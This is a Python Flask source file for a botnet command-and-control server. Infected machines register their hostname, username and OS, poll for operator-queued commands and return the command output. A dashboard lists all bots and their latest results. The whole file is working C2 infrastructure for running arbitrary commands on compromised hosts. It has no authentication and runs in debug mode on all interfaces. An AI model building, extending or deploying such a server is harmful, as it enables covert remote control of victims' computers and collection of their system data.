from flask import Flask, render_template, request, jsonify
import sqlite3
import logging

app = Flask(__name__)
# Logging configuration
logging.basicConfig(level=logging.INFO)


# ✅ Initialize the database
def init_db():
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE,
                last_seen TEXT DEFAULT (datetime('now', 'localtime')),
                status TEXT DEFAULT 'active'
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS system_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id INTEGER UNIQUE,
                hostname TEXT,
                username TEXT,
                os TEXT,
                ip TEXT,
                running_apps TEXT,
                last_updated TEXT DEFAULT (datetime('now', 'localtime'))
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id INTEGER,
                command TEXT,
                timestamp TEXT DEFAULT (datetime('now', 'localtime'))
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS command_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id INTEGER,
                output TEXT,
                timestamp TEXT DEFAULT (datetime('now', 'localtime'))
            )
        """)
        conn.commit()


# ✅ Helper function for database queries
def query_db(query, args=(), fetch_one=False):
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute(query, args)
        if fetch_one:
            return cursor.fetchone()
        return cursor.fetchall()


# ✅ Route: Register Bot
@app.route('/register', methods=['POST'])
def register_bot():
    data = request.json
    if not data or "hostname" not in data or "ip" not in data:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    ip = request.remote_addr
    hostname = data.get("hostname", "Unknown")
    username = data.get("username", "Unknown")
    os_type = data.get("os", "Unknown")

    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO bots (ip, last_seen) 
            VALUES (?, datetime('now'))
            ON CONFLICT(ip) DO UPDATE SET last_seen = datetime('now')
        """, (ip,))
        cursor.execute("SELECT id FROM bots WHERE ip = ?", (ip,))
        bot_id = cursor.fetchone()[0]

        cursor.execute("""
            INSERT INTO system_info (bot_id, hostname, username, os, ip, last_updated) 
            VALUES (?, ?, ?, ?, ?, datetime('now')) 
            ON CONFLICT(bot_id) DO UPDATE 
            SET hostname = excluded.hostname,
                username = excluded.username,
                os = excluded.os,
                ip = excluded.ip,
                last_updated = datetime('now')
        """, (bot_id, hostname, username, os_type, ip))

        conn.commit()

    return jsonify({"status": "success", "bot_id": bot_id})


# ✅ Route: Fetch Command for Specific Bot
@app.route('/command/<int:bot_id>', methods=['GET'])
def command(bot_id):
    cmd = query_db("SELECT command FROM commands WHERE bot_id = ? ORDER BY timestamp DESC LIMIT 1",
                   (bot_id,), fetch_one=True)
    return cmd[0] if cmd else "No command"


# ✅ Route: Send Command to a Bot
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')

    if not bot_id or not command:
        return jsonify({"status": "error", "message": "Invalid input"}), 400

    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO commands (bot_id, command) VALUES (?, ?)", (bot_id, command))
        conn.commit()

    return jsonify({"status": "success", "bot_id": bot_id, "command": command})


# ✅ Route: Receive Command Execution Result
@app.route('/command_result', methods=['POST'])
def command_result():
    data = request.json
    bot_id = data.get('bot_id')
    output = data.get('output')

    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO command_results (bot_id, output) VALUES (?, ?)",
                       (bot_id, output))
        conn.commit()

    return jsonify({"status": "success"})


# ✅ NEW Route: Fetch the Last Command Execution Result for a Bot
@app.route('/get_result/<int:bot_id>', methods=['GET'])
def get_result(bot_id):
    result = query_db(
        "SELECT output, timestamp FROM command_results WHERE bot_id = ? ORDER BY timestamp DESC LIMIT 1",
        (bot_id,), fetch_one=True)

    if result:
        return jsonify(
            {"status": "success", "bot_id": bot_id, "output": result[0], "timestamp": result[1]})
    else:
        return jsonify({"status": "error", "message": "No results found for this bot"}), 404


# ✅ Route: View Dashboard with All Bots
@app.route('/dashboard')
def dashboard():
    bots = query_db(
        "SELECT b.id, b.ip, b.last_seen, (SELECT output FROM command_results WHERE bot_id = b.id ORDER BY timestamp DESC LIMIT 1) AS last_output FROM bots b ORDER BY b.last_seen DESC")
    return render_template('dashboard.html', bots=bots)


if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5001, debug=True)
